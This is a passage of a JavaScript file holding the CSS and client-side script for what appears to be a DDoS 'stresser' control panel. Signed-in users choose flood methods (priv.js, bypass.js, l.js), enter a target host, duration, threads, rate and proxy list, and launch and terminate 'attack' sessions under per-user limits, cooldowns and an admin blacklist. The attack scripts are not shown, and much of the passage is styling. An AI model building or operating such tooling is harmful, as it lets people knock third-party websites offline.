'@media (min-width:901px){#sidebarBackdrop{display:none!important}}',

'.content-wrap{margin-left:260px;transition:margin-left .3s}',
'@media (max-width:900px){.content-wrap{margin-left:0}}',
'@media (min-width:901px){#appHeader{display:none}}',
'header{height:66px;display:flex;align-items:center;justify-content:space-between;padding:0 22px;position:sticky;top:0;z-index:10;background:rgba(3,4,8,.6);backdrop-filter:blur(24px);-webkit-backdrop-filter:blur(24px);border-bottom:1px solid var(--panel-border)}',
'header button{background:rgba(255,255,255,.04);border:1px solid var(--panel-border);color:var(--text);display:flex;align-items:center;justify-content:center;width:40px;height:40px;border-radius:12px;transition:all .2s cubic-bezier(0.16,1,0.3,1)}',
'header button:hover{background:rgba(255,255,255,.08);border-color:rgba(255,255,255,.15);transform:translateY(-1px)}',
'.brand{display:flex;align-items:center;gap:12px;font-size:11px;letter-spacing:.18em;font-weight:700}',
'.brand-dot{width:8px;height:8px;border-radius:50%;background:var(--accent-grad);box-shadow:0 0 14px rgba(56,189,248,.8);animation:brandPulse 2.4s ease-in-out infinite;flex-shrink:0}',
'@keyframes brandPulse{0%,100%{opacity:.6;transform:scale(1)}50%{opacity:1;transform:scale(1.2)}}',
'.brand b{display:block;color:var(--text);line-height:1;font-size:13px;letter-spacing:.08em}',
'.brand small{display:block;color:var(--muted);font-size:9px;letter-spacing:.28em;margin-top:2px}',

'main{position:relative;z-index:1;width:min(100% - 32px,640px);margin:28px auto 120px}',

'.panel{background:var(--panel);border:1px solid var(--panel-border);border-radius:var(--radius);padding:24px;margin-bottom:18px;backdrop-filter:blur(30px);-webkit-backdrop-filter:blur(30px);box-shadow:var(--shadow);position:relative;overflow:hidden;transition:border-color .3s}',
'.panel::before{content:"";position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(56,189,248,.4),transparent);opacity:.6}',
'.login{max-width:440px;margin:6vh auto;text-align:center;padding:36px 28px}',
'.login-badge{display:inline-block;padding:5px 12px;background:rgba(56,189,248,.1);border:1px solid rgba(56,189,248,.25);border-radius:20px;font-size:10px;font-weight:800;letter-spacing:.2em;color:var(--accent-cyan);margin-bottom:14px}',
'.eyebrow{font-size:10px;letter-spacing:.22em;color:var(--accent-cyan);font-weight:800;text-transform:uppercase;display:inline-block}',
'.intro{padding:4px 4px 22px}',
'.intro h1,.login h1{font-size:clamp(30px,7vw,40px);line-height:1.08;letter-spacing:-.035em;margin:10px 0;font-weight:800;color:var(--text)}',
'.intro h1 span,.login h1 span{background:var(--accent-grad);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;color:transparent}',
'.intro p,.login p{font-size:13.5px;color:var(--text-secondary);margin:8px 0 0;line-height:1.5}',
'.login p a{color:var(--accent-cyan);border-bottom:1px solid rgba(56,189,248,.3);padding-bottom:1px}',
'.login p a:hover{border-bottom-color:var(--accent-cyan)}',

'.captcha-row{display:flex;align-items:center;justify-content:space-between;gap:12px;background:rgba(10,13,20,.5);border:1px solid var(--panel-border);border-radius:var(--radius-xs);padding:12px 15px;margin-top:8px}',
'.captcha-q{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:18px;font-weight:700;color:var(--accent-cyan);letter-spacing:.05em}',
'.captcha-refresh{background:rgba(255,255,255,.04);border:1px solid var(--panel-border);color:var(--text-secondary);width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:15px;transition:all .2s;cursor:pointer}',
'.captcha-refresh:hover{color:var(--accent-cyan);border-color:rgba(56,189,248,.4);background:rgba(56,189,248,.08)}',

'.settings-partition{background:rgba(18,22,34,.45);border:1px solid rgba(255,255,255,.06);border-radius:24px;padding:20px;margin-bottom:20px;backdrop-filter:blur(25px);-webkit-backdrop-filter:blur(25px)}',
'.partition-header{display:flex;align-items:center;gap:10px;font-size:13px;font-weight:700;color:var(--accent-cyan);margin-bottom:16px;padding-bottom:10px;border-bottom:1px solid var(--panel-border);letter-spacing:.05em}',
'.partition-header svg{opacity:.9}',

'.stats{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:18px}',
'.stat{background:var(--panel);border:1px solid var(--panel-border);border-radius:var(--radius-sm);padding:14px 16px;position:relative;overflow:hidden;backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);box-shadow:0 8px 24px rgba(0,0,0,.25)}',
'.stat::after{content:"";position:absolute;top:0;right:0;width:80px;height:80px;background:radial-gradient(circle,rgba(56,189,248,.12),transparent 70%);pointer-events:none}',
'.stat-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:4px}',
'.stat-head small{color:var(--muted);font-size:9.5px;letter-spacing:.16em;font-weight:700}',
'.stat-head svg{color:var(--dim);opacity:.8}',
'.stat b{display:block;font-size:20px;font-weight:800;letter-spacing:-.02em;color:var(--text);line-height:1.2;margin-bottom:2px}',
'.stat>span{display:block;color:var(--muted);font-size:10.5px;line-height:1.4}',
'.stat .limits-detail{font-size:10px;color:var(--text-secondary);line-height:1.5;margin-top:6px;display:flex;flex-wrap:wrap;gap:4px}',
'.stat .limits-detail span{display:inline-flex;align-items:center;gap:4px;background:rgba(255,255,255,.03);border:1px solid var(--panel-border);border-radius:6px;padding:2px 8px;font-size:9.5px;color:var(--text-secondary)}',
'.stat .limits-detail span b{display:inline;font-size:9.5px;color:var(--accent-cyan);margin:0;font-weight:700}',

'.panel h2,.headrow h2{font-size:18.5px;margin:6px 0 16px;letter-spacing:-.02em;font-weight:700}',
'label{display:block;font-size:12.5px;color:var(--text-secondary);margin-bottom:16px;font-weight:500;text-align:left}',
'label small{color:var(--muted);font-size:10.5px;font-weight:400}',
'input,select{display:block;width:100%;margin-top:8px;border:1px solid var(--panel-border);background:rgba(10,13,20,.5);color:var(--text);padding:13px 15px;border-radius:var(--radius-xs);min-width:0;outline:none;transition:all .25s cubic-bezier(0.16,1,0.3,1);font-size:14px}',
'input:hover,select:hover{border-color:rgba(255,255,255,.16);background:rgba(10,13,20,.7)}',
'input:focus,select:focus{border-color:rgba(56,189,248,.6);box-shadow:var(--glow);background:rgba(10,13,20,.85)}',
'input[type="checkbox"]{width:auto;display:inline-block;margin:0;padding:0;accent-color:var(--accent-cyan)}',
'select{cursor:pointer;background-image:url("data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'12\' height=\'12\' viewBox=\'0 0 24 24\' fill=\'none\' stroke=\'%2364748b\' stroke-width=\'2.5\' stroke-linecap=\'round\' stroke-linejoin=\'round\'><polyline points=\'6 9 12 15 18 9\'/></svg>");background-repeat:no-repeat;background-position:right 14px center;padding-right:38px;-webkit-appearance:none;appearance:none}',
'.url{display:flex;align-items:center;background:rgba(10,13,20,.5);border:1px solid var(--panel-border);border-radius:var(--radius-xs);padding:0 14px;margin-top:8px;transition:all .25s}',
'.url:focus-within{border-color:rgba(56,189,248,.6);box-shadow:var(--glow);background:rgba(10,13,20,.85)}',
'.url span{color:var(--muted);font-size:13px;white-space:nowrap}',
'.url input{border:0;background:transparent;margin:0;padding:12px 6px;border-radius:0;box-shadow:none!important}',
'.cols{display:grid;grid-template-columns:1fr 1fr;gap:12px}',

'.primary{position:relative;width:100%;padding:14px 18px;border:0;border-radius:var(--radius-sm);background:var(--accent-grad);color:#030408;font-weight:700;display:flex;align-items:center;justify-content:space-between;margin-top:6px;transition:all .25s cubic-bezier(0.16,1,0.3,1);letter-spacing:.01em;font-size:14px;overflow:hidden;box-shadow:0 8px 25px rgba(56,189,248,.25)}',
'.primary::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,rgba(255,255,255,.25),transparent 50%);pointer-events:none}',
'.primary:hover{transform:translateY(-2px);box-shadow:0 12px 32px rgba(56,189,248,.4);filter:brightness(1.05)}',
'.primary:active{transform:translateY(0)}',
'.primary:disabled{opacity:.5;cursor:not-allowed;transform:none;box-shadow:none}',
'.primary span{font-size:16px;position:relative;z-index:1}',

'.btn-dots{display:inline-flex;align-items:center;gap:4px;margin-left:auto}',
'.btn-dots i{width:6px;height:6px;border-radius:50%;background:#030408;display:inline-block;animation:dot 1.2s infinite ease-in-out}',
'.btn-dots i:nth-child(1){animation-delay:0s}',
'.btn-dots i:nth-child(2){animation-delay:.15s}',
'.btn-dots i:nth-child(3){animation-delay:.3s}',
'@keyframes dot{0%,80%,100%{opacity:.25;transform:translateY(0)}40%{opacity:1;transform:translateY(-2px)}}',
'.btn-label{margin-right:auto;position:relative;z-index:1}',

'.subtle{background:rgba(255,255,255,.04);border:1px solid var(--panel-border);color:var(--text-secondary);padding:8px 14px;border-radius:10px;font-size:12px;transition:all .2s;font-weight:600}',
'.subtle:hover{border-color:rgba(56,189,248,.4);color:var(--accent-cyan);background:rgba(56,189,248,.08)}',

'.notice{background:rgba(245,158,11,.05);border:1px solid rgba(245,158,11,.2);border-left:3px solid var(--warn);padding:14px 16px;border-radius:var(--radius-xs);font-size:11.5px;color:var(--text-secondary);margin:16px 0;word-break:break-all;position:relative}',
'.notice-label{font-size:9.5px;letter-spacing:.18em;text-transform:uppercase;color:var(--warn);font-weight:800;margin-bottom:6px}',
'.notice code{background:rgba(0,0,0,.5);padding:8px 12px;border-radius:8px;font-size:11.5px;color:#38bdf8;display:block;margin-top:4px;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;overflow-x:auto;border:1px solid rgba(255,255,255,.04)}',

'.err{color:var(--danger);font-size:12.5px;min-height:20px;margin-top:10px;font-weight:500}',
'.ok{color:var(--success);font-size:12.5px;min-height:20px;margin-top:10px;font-weight:500}',

'.headrow{display:flex;align-items:center;justify-content:space-between;margin:28px 0 14px}',
'.headrow h2{margin:0}',
'.session-item{background:var(--panel);border:1px solid var(--panel-border);border-radius:var(--radius-sm);padding:16px 18px;margin-bottom:12px;backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);position:relative;overflow:hidden;transition:all .25s}',
'.session-item:hover{border-color:rgba(255,255,255,.16);transform:translateY(-1px);box-shadow:0 10px 30px rgba(0,0,0,.3)}',
'.session-item.done{border-color:rgba(34,197,94,.35)}',
'.session-item .top{display:flex;align-items:center;gap:8px;font-size:14px}',
'.session-item .top b{color:var(--text);font-weight:700}',
'.session-item .top .arrow{color:var(--muted);font-weight:400}',
'.session-item .top .host{color:var(--accent-cyan);font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:13px;word-break:break-all}',
'.session-item .meta{font-size:11px;color:var(--muted);margin-top:8px;display:flex;flex-wrap:wrap;gap:8px;align-items:center}',
'.session-item .meta .chip{display:inline-flex;align-items:center;gap:5px;background:rgba(255,255,255,.03);border:1px solid var(--panel-border);border-radius:20px;padding:3px 10px;font-size:10px;color:var(--text-secondary);font-weight:500}',
'.session-item .meta .dot{width:6px;height:6px;border-radius:50%;background:var(--success);box-shadow:0 0 10px var(--success);animation:dotPulse 1.6s ease-in-out infinite}',
'.session-item .meta .dot.done{animation:none;background:#22c55e;box-shadow:0 0 10px #22c55e}',
'@keyframes dotPulse{0%,100%{opacity:1}50%{opacity:.4}}',
'.session-item .cmd{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:11px;color:#94a3b8;background:rgba(0,0,0,.45);padding:10px 12px;border-radius:9px;margin-top:12px;word-break:break-all;border:1px solid rgba(255,255,255,.04)}',
'.session-item .actions{margin-top:14px;display:flex;gap:8px}',
'.session-item .actions button{background:var(--danger-bg);border:1px solid var(--danger-line);color:var(--danger);padding:7px 14px;border-radius:9px;font-size:11.5px;font-weight:600;transition:all .2s}',
'.session-item .actions button:hover{background:rgba(244,63,94,.2);border-color:rgba(244,63,94,.6)}',
'.session-item .actions button.owner-chip{background:rgba(56,189,248,.08);border-color:rgba(56,189,248,.35);color:var(--accent-cyan);cursor:default}',
'.session-item .actions button.done-chip{background:rgba(34,197,94,.08);border-color:rgba(34,197,94,.35);color:#22c55e;cursor:default}',
'.session-item .progress{position:absolute;left:0;bottom:0;height:2.5px;background:var(--accent-grad);border-radius:0 2px 2px 0;transition:width .2s linear}',
'.session-item.done .progress{background:linear-gradient(90deg,#22c55e,#38bdf8)}',

'.user-row{display:grid;grid-template-columns:1fr auto;gap:12px;align-items:center;padding:15px 0;border-bottom:1px solid var(--panel-border)}',
'.user-row:last-child{border-bottom:0}',
'.user-row b{display:block;font-size:14px;color:var(--text);font-weight:700}',
'.user-row .meta{font-size:11px;color:var(--muted);margin-top:4px;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}',
'.user-row .row-actions{display:flex;gap:6px;flex-wrap:wrap;justify-content:flex-end}',
'.user-row .row-actions button{background:rgba(255,255,255,.04);border:1px solid var(--panel-border);color:var(--text-secondary);padding:7px 12px;border-radius:9px;font-size:11.5px;font-weight:600;transition:all .2s}',
'.user-row .row-actions button:hover{border-color:rgba(255,255,255,.16);color:var(--text);background:rgba(255,255,255,.08)}',
'.user-row .row-actions button.danger{background:var(--danger-bg);border-color:var(--danger-line);color:var(--danger)}',
'.user-row .row-actions button.danger:hover{background:rgba(244,63,94,.2)}',
'.edit-limits{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:12px}',
'.edit-limits input,.edit-limits select{margin-top:0;padding:8px;font-size:12px}',

'.bl-item{display:flex;justify-content:space-between;align-items:center;padding:13px 0;border-bottom:1px solid var(--panel-border);font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:12px;color:var(--text-secondary)}',
'.bl-item:last-child{border-bottom:0}',
'.bl-item span{display:flex;align-items:center;gap:8px}',
'.bl-item span::before{content:"";width:5px;height:5px;border-radius:50%;background:var(--danger);box-shadow:0 0 8px var(--danger)}',
'.bl-item button{background:var(--danger-bg);border:1px solid var(--danger-line);color:var(--danger);padding:6px 12px;border-radius:8px;font-size:11.5px;transition:all .2s}',
'.bl-item button:hover{background:rgba(244,63,94,.2)}',

'#toast{position:fixed;bottom:40px;left:50%;transform:translateX(-50%);background:rgba(15,18,28,.95);color:var(--text);border:1px solid rgba(255,255,255,.12);padding:12px 22px;border-radius:14px;font-size:13px;font-weight:600;z-index:110;box-shadow:0 16px 40px rgba(0,0,0,.7);backdrop-filter:blur(24px);-webkit-backdrop-filter:blur(24px);animation:toastIn .3s cubic-bezier(0.16,1,0.3,1)}',
'@keyframes toastIn{from{transform:translate(-50%,12px);opacity:0}to{transform:translate(-50%,0);opacity:1}}',

'.tool-btn{display:flex;align-items:center;gap:14px;width:100%;background:var(--panel);border:1px solid var(--panel-border);border-radius:var(--radius-sm);padding:16px 18px;color:var(--text);margin-bottom:12px;transition:all .25s;backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px)}',
'.tool-btn:hover{border-color:rgba(56,189,248,.4);transform:translateY(-1px);box-shadow:0 10px 30px rgba(0,0,0,.3)}',
'.tool-icon{width:44px;height:44px;border-radius:12px;background:linear-gradient(135deg,rgba(56,189,248,.15),rgba(192,132,252,.12));border:1px solid rgba(56,189,248,.25);display:flex;align-items:center;justify-content:center;color:var(--accent-cyan);flex-shrink:0}',
'.tool-text{flex:1;text-align:left}',
'.tool-text b{display:block;font-size:14.5px;font-weight:700;color:var(--text);margin-bottom:2px}',
'.tool-text small{display:block;font-size:11.5px;color:var(--muted);font-weight:400}',
'.tool-arrow{color:var(--muted);font-size:16px;transition:transform .2s}',
'.tool-btn:hover .tool-arrow{transform:translateX(4px);color:var(--accent-cyan)}',

'.tool-output{margin-top:16px;background:rgba(0,0,0,.5);border:1px solid var(--panel-border);border-radius:var(--radius-xs);padding:16px;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:12px;color:var(--text-secondary);min-height:60px;max-height:340px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.75}',
'.spinner{display:inline-block;width:13px;height:13px;border:2px solid rgba(56,189,248,.2);border-top-color:var(--accent-cyan);border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle;margin-right:8px}',
'@keyframes spin{to{transform:rotate(360deg)}}',

'.scan-bar{height:2.5px;background:rgba(255,255,255,.05);border-radius:2px;overflow:hidden;margin:12px 0;position:relative}',
'.scan-bar::after{content:"";position:absolute;top:0;left:-40%;width:40%;height:100%;background:linear-gradient(90deg,transparent,var(--accent-cyan),transparent);animation:scan 1.2s linear infinite}',
'@keyframes scan{0%{left:-40%}100%{left:100%}}',
'.ping-ok{color:#22c55e}',
'.ping-fail{color:#f43f5e}',
'.ping-summary{color:#38bdf8;margin-top:10px;font-weight:600}',
'.https-online{color:#22c55e;font-weight:700;font-size:14px}',
'.https-offline{color:#f43f5e;font-weight:700;font-size:14px}',
'.https-detail{color:#94a3b8;margin-top:6px}',
'.https-checking{color:#94a3b8}',

'.empty-state{color:var(--muted);font-size:13.5px;padding:28px 12px;text-align:center;border:1px dashed var(--panel-border);border-radius:var(--radius-sm);background:rgba(0,0,0,.2)}',

'@media (max-width:560px){main{margin-top:18px}.login{margin-top:3vh;padding:28px 22px}}',
'@media (max-width:420px){',
'body{font-size:14px}',
'main{width:100%;margin:12px auto 80px;padding:0 12px}',
'.panel{padding:18px;border-radius:16px}',
'.login{padding:24px 18px}',
'.intro h1,.login h1{font-size:26px}',
'.stats{grid-template-columns:1fr;gap:8px}',
'.stat b{font-size:18px}',
'header{height:56px;padding:0 14px}',
'.tool-btn{padding:12px 14px}',
'.tool-icon{width:38px;height:38px}',
'.tool-text b{font-size:13px}',
'.tool-text small{font-size:10.5px}',
'.captcha-q{font-size:16px}',
'.cols{grid-template-columns:1fr}',
'.edit-limits{grid-template-columns:repeat(2,1fr)}',
'.session-item .cmd{font-size:10px}',
'}',
'@media (max-width:400px){.stats{grid-template-columns:1fr}.stat b{font-size:18px}}'
].join('\n');

const UI_JS = [
'(function(){',
'"use strict";',
'try{',
'if(window.Telegram&&window.Telegram.WebApp){',
'var tg=window.Telegram.WebApp;',
'tg.ready();',
'tg.expand();',
'if(tg.disableVerticalSwipes)tg.disableVerticalSwipes();',
'if(tg.setHeaderColor)tg.setHeaderColor("#030408");',
'if(tg.setBackgroundColor)tg.setBackgroundColor("#030408");',
'if(tg.viewportStableHeight){document.documentElement.style.setProperty("--tg-viewport-height",tg.viewportStableHeight+"px");}',
'tg.onEvent&&tg.onEvent("viewportChanged",function(){if(tg.viewportStableHeight){document.documentElement.style.setProperty("--tg-viewport-height",tg.viewportStableHeight+"px");}});',
'}',
'}catch(e){}',
'var $=function(s){return document.querySelector(s);};',
'var $$=function(s){return document.querySelectorAll(s);};',
'var currentUser=null,sessionPoll=null,localTimerInterval=null,cooldownTick=null,methodsList=[];',
'var activeSessionsCache=[];',
'var cooldownRemaining=0;',
'var loginSection=$("#login"),hubSection=$("#hub"),settingsSection=$("#settings"),toolsSection=$("#tools"),registerSection=$("#register");',
'var adminPanel=$("#admin"),adminBlacklist=$("#adminBlacklist"),sidebar=$("#sidebar"),sidebarBackdrop=$("#sidebarBackdrop");',
'function showToast(msg){',
'var t=$("#toast");if(!t)return;',
't.textContent=msg;t.classList.remove("hide");',
'clearTimeout(t._timer);t._timer=setTimeout(function(){t.classList.add("hide");},3200);',
'}',
'function escapeHtml(s){return String(s==null?"":s).replace(/[&<>"\\\']/g,function(c){return{"&":"&amp;","<":"&lt;",">":"&gt;","\\"":"&quot;","\\\'":"&#39;"}[c];});}',
'function limitLabel(v){return (v===0||v===undefined||v===null)?"unlimited":String(v);}',

'async function api(path,opts){',
'opts=opts||{};',
'var res=await fetch(path,Object.assign({',
'headers:{"Content-Type":"application/json"},',
'credentials:"same-origin"',
'},opts));',
'var data={};',
'try{data=await res.json();}catch(e){}',
'if(!res.ok){',
'var err=new Error(data.error||("HTTP "+res.status));',
'if(data.cooldownRemaining!==undefined)err.cooldownRemaining=data.cooldownRemaining;',
'if(res.status===401){',
'currentUser=null;updateAuthUI();updateRoleDisplay();',
'showToast(data.error||"Session ended. Please sign in again.");',
'setPage("login");',
'}',
'throw err;',
'}',
'return data;',
'}',

'function openSidebar(){sidebar.classList.add("open");sidebarBackdrop.classList.remove("hide");}',
'function closeSidebar(){sidebar.classList.remove("open");sidebarBackdrop.classList.add("hide");}',
'function closeSidebarOnMobile(){if(window.innerWidth<=900)closeSidebar();}',

'function setPage(page){',
'var isAdmin=currentUser&&currentUser.role==="admin";',
'if((page==="settings"||page==="tools")&&!currentUser){',
'showToast("Please sign in to access this.");',
'page="login";',
'}',
'loginSection.classList.add("hide");',
'hubSection.classList.add("hide");',
'settingsSection.classList.add("hide");',
'toolsSection.classList.add("hide");',
'registerSection.classList.add("hide");',
'if(page==="hub")hubSection.classList.remove("hide");',
'else if(page==="settings")settingsSection.classList.remove("hide");',
'else if(page==="tools")toolsSection.classList.remove("hide");',
'else if(page==="login"){loginSection.classList.remove("hide");loadCaptcha("login");}',
'else if(page==="register"){registerSection.classList.remove("hide");loadCaptcha("register");}',
'$$("#sidebar button[data-page]").forEach(function(b){b.classList.toggle("active",b.dataset.page===page);});',
'closeSidebarOnMobile();',
'if(page==="settings"&&isAdmin){',
'adminPanel.classList.remove("hide");adminBlacklist.classList.remove("hide");',
'loadUsers();loadBlacklist();',
'}else{',
'adminPanel.classList.add("hide");adminBlacklist.classList.add("hide");',
'}',
'}',

'function updateAuthUI(){',
'var loggedIn=!!currentUser;',
'var navLogin=$("#navLogin"),navRegister=$("#navRegister"),navLogout=$("#navLogout");',
'if(navLogin)navLogin.classList.toggle("hide",loggedIn);',
'if(navRegister)navRegister.classList.toggle("hide",loggedIn);',
'if(navLogout)navLogout.classList.toggle("hide",!loggedIn);',
'}',

'function updateRoleDisplay(){',
'if(!currentUser){',
'var r0=$("#role");if(r0)r0.textContent="Guest";',
'var lim0=$("#limitsLine");if(lim0)lim0.textContent="Sign in to deploy";',
'return;',
'}',
'var r=$("#role");',
'if(r){',
'var roleLabel = currentUser.role==="admin"?"Admin":(currentUser.role==="pending"?"Pending":"User");',
'r.textContent=roleLabel;',
'}',
'var lim=$("#limitsLine");',
'if(lim&&currentUser.limits){',
'var L=currentUser.limits;',
'if(currentUser.role==="admin"){',
'lim.innerHTML=\'<span class="limits-detail"><span>Duration <b>Unlimited</b></span><span>Threads <b>Unlimited</b></span><span>Rate <b>Unlimited</b></span><span>Concurrent <b>Unlimited</b></span></span>\';',
'}else if(currentUser.role==="pending"){',
'lim.innerHTML=\'<span class="limits-detail"><span>Awaiting approval — browsing only</span></span>\';',
'}else{',
'lim.innerHTML=\'<span class="limits-detail">\'+',
'\'<span>Duration <b>\'+limitLabel(L.maxDuration)+\'</b></span>\'+',
'\'<span>Threads <b>\'+limitLabel(L.maxThreads)+\'</b></span>\'+',
'\'<span>Rate <b>\'+limitLabel(L.maxRate)+\'</b></span>\'+',
'\'<span>Concurrent <b>\'+limitLabel(L.maxConcurrent)+\'</b></span>\'+',
'\'</span>\';',
'}',
'}',
'}',

'function applyUserLimits(){',
'if(!currentUser||!currentUser.limits)return;',
'var L=currentUser.limits;',
'var d=$("#durationInput"),th=$("#threadsInput"),r=$("#rateInput");',
'function apply(el,v){',
'if(!el)return;',
'if(v>0){el.max=v;if(Number(el.value)>v)el.value=v;}',
'else{el.removeAttribute("max");}',
'}',
'apply(d,L.maxDuration);',
'apply(th,L.maxThreads);',
'apply(r,L.maxRate);',
'}',

'async function checkAuth(){',
'try{',
'var data=await api("/api/me");',
'currentUser=data.user;',
'}catch(e){currentUser=null;}',
'updateAuthUI();updateRoleDisplay();',
'if(currentUser){',
'applyUserLimits();',
'await loadMethods();',
'await loadSessions();',
'}else{',
'loadSessions();',
'}',
'return currentUser;',
'}',

'async function loadCaptcha(which){',
'which=which||"register";',
'var el=which==="login"?$("#loginCaptchaQuestion"):$("#captchaQuestion");',
'if(el)el.textContent="…";',
'try{',
'var data=await api("/api/captcha");',
'if(el)el.textContent=data.question+" = ?";',
'}catch(e){',
'if(el)el.textContent="Error";',
'}',
'}',

'async function loadMethods(){',
'var sel=$("#methodSelect");',
'var hint=$("#methodsHint");',
'if(!sel)return;',
'if(!currentUser){',
'sel.innerHTML=\'<option value="">Sign in to load methods</option>\';',
'if(hint)hint.textContent="Sign in to select a method.";',
'return;',
'}',
'try{',
'var data=await api("/api/methods");',
'methodsList=data.methods||[];',
'sel.innerHTML="";',
'if(!methodsList.length){',
'var opt=document.createElement("option");',
'opt.value="";opt.textContent="No methods found";',
'sel.appendChild(opt);',
'if(hint)hint.textContent="Place priv.js / bypass.js / l.js next to hub.js in: "+data.dir;',
'return;',
'}',
'methodsList.forEach(function(m){',
'var opt=document.createElement("option");',
'opt.value=m.id;opt.textContent=m.name;',
'sel.appendChild(opt);',
'});',
'sel.value=methodsList[0].id;',
'var proxyNote=data.proxyExists?"":" (WARNING: "+data.proxy+" missing!)";',
'var iranNote=data.iranExists?"":" (WARNING: "+data.iran+" missing!)";',
'if(hint)hint.textContent=methodsList.length+" method"+(methodsList.length===1?"":"s")+" | "+data.proxy+proxyNote+" | "+data.iran+iranNote;',
'updateMethodFields();',
'updateCmdPreview();',
'}catch(e){',
'sel.innerHTML=\'<option value="">Failed to load</option>\';',
'if(hint)hint.textContent="Error: "+e.message;',
'}',
'}',

'function updateMethodFields(){',
'var sel=$("#methodSelect");',
'if(!sel)return;',
'var m=sel.value;',
'var methodInfo=methodsList.find(function(x){return x.id===m;});',
'var fields=methodInfo&&methodInfo.fields?methodInfo.fields:[];',
'var reqWrap=$("#reqMethodWrap");',
'var bypassFields=$("#bypassFields");',
'var cRushProxyWrap=$("#cRushProxyWrap");',
'var flagFields=$("#flagFields");',
'var cacheWrap=$("#cacheWrap");',
'var wantsReqMethod=fields.indexOf("reqmethod")!==-1;',
'var wantsBypassExtras=fields.indexOf("query")!==-1;',
'var wantsProxyfile=fields.indexOf("proxyfile")!==-1;',
'var wantsCookies=fields.indexOf("cookies")!==-1;',
'var wantsHeaders=fields.indexOf("headers")!==-1;',
'var wantsCache=fields.indexOf("cache")!==-1;',
'if(reqWrap){if(wantsReqMethod)reqWrap.classList.remove("hide");else reqWrap.classList.add("hide");}',
'if(bypassFields){if(wantsBypassExtras)bypassFields.classList.remove("hide");else bypassFields.classList.add("hide");}',
'if(cRushProxyWrap){if(wantsProxyfile)cRushProxyWrap.classList.remove("hide");else cRushProxyWrap.classList.add("hide");}',
'if(flagFields){if(wantsCookies||wantsHeaders||wantsCache)flagFields.classList.remove("hide");else flagFields.classList.add("hide");}',
'if(cacheWrap){if(wantsCache)cacheWrap.style.display="flex";else cacheWrap.style.display="none";}',
'}',

'function renderCooldown(){',
'var wrap=$("#cooldownNotice");',
'var txt=$("#cooldownText");',
'var btn=$("#startBtn");',
'if(!wrap||!txt)return;',
'if(cooldownRemaining>0){',
'wrap.classList.remove("hide");',
'txt.textContent="Cooldown is set — wait "+cooldownRemaining+" second"+(cooldownRemaining===1?"":"s")+".";',
'if(btn)btn.disabled=true;',
'}else{',
'wrap.classList.add("hide");',
'if(btn)btn.disabled=false;',
'}',
'}',

'function startCooldownTicker(){',
'if(cooldownTick)clearInterval(cooldownTick);',
'cooldownTick=setInterval(function(){',
'if(cooldownRemaining>0){',
'cooldownRemaining-=1;',
'if(cooldownRemaining<0)cooldownRemaining=0;',
'renderCooldown();',
'}',
'},1000);',
'}',

'async function loadSessions(){',
'if(!currentUser){',
'activeSessionsCache=[];',
'var cap=$("#capacity"),slots=$("#slots");',
'if(cap)cap.textContent="0/0";',
'if(slots)slots.textContent="sign in to deploy";',
'var container=$("#sessions");',
'if(container)container.innerHTML=\'<div class="empty-state">Sign in to view and deploy live sessions.</div>\';',
'cooldownRemaining=0;renderCooldown();',
'return;',
'}',
'try{',
'var data=await api("/api/sessions");',
'activeSessionsCache=(data.sessions||[]).map(function(s){s.serverElapsed=s.elapsedSeconds;return s;});',
'if(data.cooldownRemaining!==undefined)cooldownRemaining=data.cooldownRemaining;',
'renderCooldown();',
'renderSessions(data);',
'}catch(e){}',
'}',

'function renderSessions(data){',
'var list=activeSessionsCache;',
'var cap=$("#capacity"),slots=$("#slots");',
'if(cap)cap.textContent=list.length+"/"+(data.capacity||0);',
'if(slots)slots.textContent=(data.available||0)+" slot"+((data.available===1)?"":"s")+" available";',
'var container=$("#sessions");',
'if(!container)return;',
'if(!list.length){',
'container.innerHTML=\'<div class="empty-state">No live sessions. Deploy one above to begin.</div>\';',
'return;',
'}',
'var me=currentUser&&currentUser.username;',
'var isAdmin=currentUser&&currentUser.role==="admin";',
'container.innerHTML=list.map(function(s){',
'var pct=Math.min(100,Math.round((s.elapsedSeconds/s.duration)*100));',
'var done=s.status==="done";',
'var canStop=(!done&&(isAdmin||s.owner===me));',
'var actionHtml;',
'if(done){',
'actionHtml=\'<div class="actions"><button class="done-chip" type="button" disabled>✓ Attack done</button></div>\';',
'}else if(canStop){',
'actionHtml=\'<div class="actions"><button class="stop-btn" data-id="\'+s.id+\'" type="button">Terminate</button></div>\';',
'}else{',
'actionHtml=\'<div class="actions"><button class="owner-chip" type="button" disabled>Owned by \'+escapeHtml(s.owner)+\'</button></div>\';',
'}',
'return \'<div class="session-item\'+(done?\' done\':\'\')+\'" data-id="\'+s.id+\'">\'+',
'\'<div class="top"><b>\'+escapeHtml(s.method)+\'</b><span class="arrow">→</span><span class="host">\'+escapeHtml(s.target)+\'</span></div>\'+',
'\'<div class="meta"><span class="chip">\'+(done?\'<span class="dot done"></span>\':\'<span class="dot"></span>\')+escapeHtml(s.status)+\'</span>\'+',
'\'<span class="chip time-chip">\'+s.elapsedSeconds+\'s / \'+s.duration+\'s</span>\'+',
'\'<span class="chip">\'+escapeHtml(s.owner)+\'</span></div>\'+',
'\'<div class="cmd">$ \'+escapeHtml(s.command)+\'</div>\'+',
'actionHtml+',
'\'<div class="progress" style="width:\'+pct+\'%"></div>\'+',
'\'</div>\';',
'}).join("");',
'container.querySelectorAll(".stop-btn").forEach(function(btn){',
